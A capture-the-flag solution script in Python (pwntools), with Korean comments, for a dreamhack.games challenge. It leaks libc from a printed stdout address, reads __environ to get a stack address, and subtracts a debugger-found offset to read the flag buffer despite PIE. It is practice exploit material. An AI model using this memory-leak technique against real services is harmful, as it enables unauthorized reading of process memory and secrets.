'''
__environ자체는 라이브러리에 존재하지만
__environ가 가리키는 주소는 스택에 존재한다.
따라서 __environ이 가르키는 값(주소)는 스택영역임으로 read_file 함수에서 사용하는
스택 영역에 존재하는 file_buf의 주소와 항상 똑같은 간격(offset)으로
떨어져 있을 것임으로, 동적 디버깅을 통해서 떨어진 거리(offset)을 구하며
PIE가 적용되어도 file_buf의 주소를 구할 수 있다.
file_buf에는 read함수로 Flag을 읽은 값이 저장되어 있을 것임으로
file_buf의 값을 읽도록 payload를 작성하면 된다.

offset 구하는 방법 :
read(fd, file_buf, sizeof(file_buf) - 1); 에 해당하는
call read@0plt에 bp를 걸고 rcx 레지스터를 확인하면 
x/gx $rcx 사용
file_buf의 주소가 확인가능하다.
__environ이 가르키는 주소는 p/x __environ 명령어로 확인할 수 있다.
그리고 read_file 함수에서 file_buf의 주소는 __environ가 가리키는 주소에서
0x1568 떨어진 곳에 존재한다.
'''
from pwn import *
context.arch='amd64'
context.log_level = 'debug'

p = remote("host1.dreamhack.games", 17539)  # 원격 서버 접속
libc = ELF('./libc.so.6')

p.recvuntil(b": ")
stdout = int(p.recvuntil(b'\n'), 16)  # stdout 주소 받기  
# libc 베이스 주소 계산
libc.address = stdout - libc.symbols['_IO_2_1_stdout_']  
log.info(f"libc base address: {hex(libc.address)}")
# __environ 주소
env = libc.symbols['__environ']  
log.info(f"__environ address: {hex(env)}")

p.sendlineafter(b'>',b'1') # switch문에서 1 선택
p.sendlineafter(b':',str(env).encode())  # 임의로 읽을 주소를 __environ으로 설정
p.recv(1) # 응답 받기
stack_environ = u64(p.recv(6).ljust(8, b'\x00'))  # __environ가 가르키는 값 받기 -> 스택 주소

file_content = stack_environ - 0x1568  # 파일 내용 주소 계산
log.info(f"Stack __environ address: {hex(stack_environ)}")

p.sendlineafter(b'>', b'1') # switch문에서 1 선택
p.sendlineafter(b':', str(file_content).encode())
p.interactive()


